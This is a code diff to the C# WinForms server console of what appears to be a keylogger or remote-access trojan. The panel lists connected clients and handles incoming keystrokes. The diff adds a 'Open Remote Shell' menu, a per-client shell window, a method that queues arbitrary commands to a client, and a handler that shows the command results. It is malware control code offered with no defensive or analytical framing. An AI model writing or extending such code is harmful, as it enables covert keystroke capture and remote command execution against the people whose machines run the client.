@@ -8,6 +8,7 @@ namespace Server.UI
     {
         private ServerLogic? _serverLogic;
         private bool _isRunning = false;
+        private Dictionary<int, RemoteShellForm> _shellForms = new();
 
         // UI Controls
         private TextBox txtDomain = null!;
@@ -35,6 +36,7 @@ namespace Server.UI
             _serverLogic.OnClientAdded += AddClientToList;
             _serverLogic.OnClientCountChanged += UpdateClientCount;
             _serverLogic.OnDataReceived += OnKeystrokeReceived;
+            _serverLogic.OnCommandResult += OnCommandResultReceived;
         }
 
         private void InitializeCustomComponents()
@@ -160,6 +162,13 @@ namespace Server.UI
             lvClients.Columns.Add("Connected At", 150);
             lvClients.Columns.Add("Packets", 80);
             lvClients.Columns.Add("Data Size", 100);
+            
+            // Add context menu for right-click
+            ContextMenuStrip contextMenu = new ContextMenuStrip();
+            ToolStripMenuItem menuRemoteShell = new ToolStripMenuItem("🖥️ Open Remote Shell");
+            menuRemoteShell.Click += MenuRemoteShell_Click;
+            contextMenu.Items.Add(menuRemoteShell);
+            lvClients.ContextMenuStrip = contextMenu;
 
             grpClients.Controls.Add(lvClients);
             splitContainer.Panel1.Controls.Add(grpClients);
@@ -358,13 +367,73 @@ namespace Server.UI
             // Update client list
             foreach (ListViewItem item in lvClients.Items)
             {
-                if ((int)item.Tag == connectionId)
+                if (item.Tag != null && (int)item.Tag == connectionId)
                 {
                     int packets = int.Parse(item.SubItems[3].Text) + 1;
                     item.SubItems[3].Text = packets.ToString();
                     break;
                 }
             }
+        }
+
+        private void MenuRemoteShell_Click(object? sender, EventArgs e)
+        {
+            if (lvClients.SelectedItems.Count == 0)
+            {
+                MessageBox.Show("Please select a client first.", "No Selection", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                return;
+            }
+
+            var selectedItem = lvClients.SelectedItems[0];
+            if (selectedItem.Tag == null)
+            {
+                MessageBox.Show("Invalid client selection.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+            
+            int connectionId = (int)selectedItem.Tag;
+            string clientIp = selectedItem.SubItems[1].Text;
+
+            // Check if shell already open for this connection
+            if (_shellForms.ContainsKey(connectionId) && !_shellForms[connectionId].IsDisposed)
+            {
+                _shellForms[connectionId].Focus();
+                return;
+            }
+
+            // Create new shell form
+            var shellForm = new RemoteShellForm(connectionId, clientIp, SendCommandToClient);
+            shellForm.FormClosed += (s, args) => _shellForms.Remove(connectionId);
+            _shellForms[connectionId] = shellForm;
+            shellForm.Show();
+
+            LogMessage($"[Shell] Opened remote shell for connection #{connectionId}");
+        }
+
+        private void SendCommandToClient(int connectionId, string command)
+        {
+            if (_serverLogic != null)
+            {
+                _serverLogic.EnqueueCommand(connectionId, command);
+                LogMessage($"[Command] Sent to connection #{connectionId}: '{command}'");
+            }
+        }
+
+        private void OnCommandResultReceived(int connectionId, string result)
+        {
+            if (this.InvokeRequired)
+            {
+                this.Invoke(() => OnCommandResultReceived(connectionId, result));
+                return;
+            }
+
+            // Send result to shell form if open
+            if (_shellForms.ContainsKey(connectionId) && !_shellForms[connectionId].IsDisposed)
+            {
+                _shellForms[connectionId].AppendOutput(result);
+            }
+
+            LogMessage($"[Result] From connection #{connectionId}: {result.Length} bytes");
         }
 
         private void MainForm_FormClosing(object? sender, FormClosingEventArgs e)
@@ -386,6 +455,13 @@ namespace Server.UI
                 {
                     e.Cancel = true;
                 }
+            }
+
+            // Close all shell forms
+            foreach (var form in _shellForms.Values)
+            {
+                if (!form.IsDisposed)
+                    form.Close();
             }
         }
     }
